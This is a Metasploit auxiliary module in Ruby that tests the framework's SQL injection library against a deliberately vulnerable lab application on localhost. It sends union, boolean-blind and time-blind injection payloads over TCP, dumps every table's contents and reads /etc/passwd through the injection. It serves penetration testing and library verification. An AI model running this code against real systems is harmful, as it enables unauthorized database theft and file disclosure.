# frozen_string_literal: true

require 'socket'
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::SQLi
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SQL injection testing module',
        'Description' => %q{
          This module tests the SQL injection library against a vulnerable application from https://github.com/red0xff/sqli_vulnerable
        },
        'Author' => [
          'Redouane NIBOUCHA <rniboucha[at]yahoo.fr>'
        ],
        'License' => MSF_LICENSE,
        'Platform' => %w[linux],
        'References' => ['URL', 'https://github.com/red0xff/sqli_vulnerable'],
        'DefaultTarget' => 0
      )
    )
    register_options(
      [
        Opt::RHOST('127.0.0.1'),
        OptInt.new('RPORT', [true, 'The target port', 1337]),
        OptString.new('TARGETURI', [true, 'The target URI', '/']),
        OptEnum.new('SQLI_TYPE', [true, 'The type of SQL injection to test', 'Regular', %w[Regular BooleanBlind TimeBlind]]),
        OptBool.new('SAFE', [false, 'Use safe mode', false]),
        OptString.new('ENCODER', [false, 'an encoder to use (hex for example)', '']),
        OptBool.new('HEX_ENCODE_STRINGS', [false, 'Replace strings in the query with hex numbers?', false]),
        OptInt.new('TRUNCATION_LENGTH', [true, 'Test SQLi with truncated output (0 or negative to disable)', 0]),
        OptEnum.new('DBMS', [ true, 'The DBMS to target', 'MariaDB', %w[MariaDB PostgreSQL Sqlite MSSQL]])
      ]
    )
  end

  def boolean_blind
    encoder = datastore['ENCODER'].nil? || datastore['ENCODER'].empty? ? nil : datastore['ENCODER'].intern
    sqli = create_sqli(dbms: @dbms, opts: {
      encoder: encoder,
      hex_encode_strings: datastore['HEX_ENCODE_STRINGS'],
      concat_separator: '@',
      second_concat_separator: '#'
    }) do |payload|
      sock = TCPSocket.open(datastore['RHOST'], datastore['RPORT'])
      sock.puts('0 or ' + payload + ' --')
      res = sock.gets.chomp
      sock.close
      res && !res.include?('No results')
    end
    unless sqli.test_vulnerable
      print_bad("Doesn't seem to be vulnerable")
      return
    end
    perform_sqli(sqli)
  end

  def reflected
    encoder = datastore['ENCODER'].nil? || datastore['ENCODER'].empty? ? nil : datastore['ENCODER'].intern
    truncation = datastore['TRUNCATION_LENGTH'] <= 0 ? nil : datastore['TRUNCATION_LENGTH']
    sqli = create_sqli(dbms: @dbms, opts: {
      encoder: encoder,
      hex_encode_strings: datastore['HEX_ENCODE_STRINGS'],
      truncation_length: truncation,
      safe: datastore['SAFE'],
      concat_separator: '@',
      second_concat_separator: '#'
    }) do |payload|
      sock = TCPSocket.open(datastore['RHOST'], datastore['RPORT'])
      sock.puts('0 union ' + payload)
      res = ""
      begin
        while true
          res += sock.readline
        end
      rescue EOFError
        vprint_status("Hit end of file...")
      end
      sock.close
      truncation ? res[0, truncation] : res
    end
    #unless sqli.test_vulnerable
    #  print_bad("Doesn't seem to be vulnerable")
    #  return
    #end
    perform_sqli(sqli)
  end

  def time_blind
    encoder = datastore['ENCODER'].nil? || datastore['ENCODER'].empty? ? nil : datastore['ENCODER'].intern
    sqli = create_sqli(dbms: @dbms, opts: {
      encoder: encoder,
      hex_encode_strings: datastore['HEX_ENCODE_STRINGS'],
      concat_separator: '@',
      second_concat_separator: '#'
    }) do |payload|
      sock = TCPSocket.open(datastore['RHOST'], datastore['RPORT'])

      if datastore['DBMS'] == 'MSSQL'
        sock.puts("0;#{payload} --")
      else
        sock.puts('0 or ' + payload + ' --')
      end

      sock.gets
      sock.close
    end
    unless sqli.test_vulnerable
      print_bad("Doesn't seem to be vulnerable")
      return
    end
    perform_sqli(sqli)
  end

  def perform_sqli(sqli)
    print_good "dbms version: #{sqli.version}"
    tables = sqli.enum_table_names
    tables.map! { |table| table.strip }
    print_good "tables: #{tables.join(', ')}"
    tables.each do |table|
      columns = sqli.enum_table_columns(table)
      columns.map! { |column| column.strip }
      print_good "#{table}(#{columns.join(', ')})"
      content = sqli.dump_table_fields(table, columns)
      content.each do |row|
        print_good "\t" + row.join(', ')
      end
    end
    passwd_content = sqli.read_from_file('/etc/passwd')
    print_good("Got #{passwd_content}")
  end

  def run
    case datastore['SQLI_TYPE']
    when 'Regular'
      @dbms = case datastore['DBMS']
              when 'MariaDB' then Msf::Exploit::SQLi::MySQLi::Common
              when 'PostgreSQL' then Msf::Exploit::SQLi::PostgreSQLi::Common
              when 'Sqlite' then Msf::Exploit::SQLi::SQLitei::Common
              when 'MSSQL' then Msf::Exploit::SQLi::Mssqli::Common
              end
      reflected
    when 'BooleanBlind'
      @dbms = case datastore['DBMS']
              when 'MariaDB' then Msf::Exploit::SQLi::MySQLi::BooleanBasedBlind
              when 'PostgreSQL' then Msf::Exploit::SQLi::PostgreSQLi::BooleanBasedBlind
              when 'Sqlite' then Msf::Exploit::SQLi::SQLitei::BooleanBasedBlind
              when 'MSSQL' then Msf::Exploit::SQLi::Mssqli::BooleanBasedBlind
              end
      boolean_blind
    when 'TimeBlind'
      @dbms = case datastore['DBMS']
              when 'MariaDB' then Msf::Exploit::SQLi::MySQLi::TimeBasedBlind
              when 'PostgreSQL' then Msf::Exploit::SQLi::PostgreSQLi::TimeBasedBlind
              when 'Sqlite' then Msf::Exploit::SQLi::SQLitei::TimeBasedBlind
              when 'MSSQL' then Msf::Exploit::SQLi::Mssqli::TimeBasedBlind
              end
      time_blind
    end
  end
end
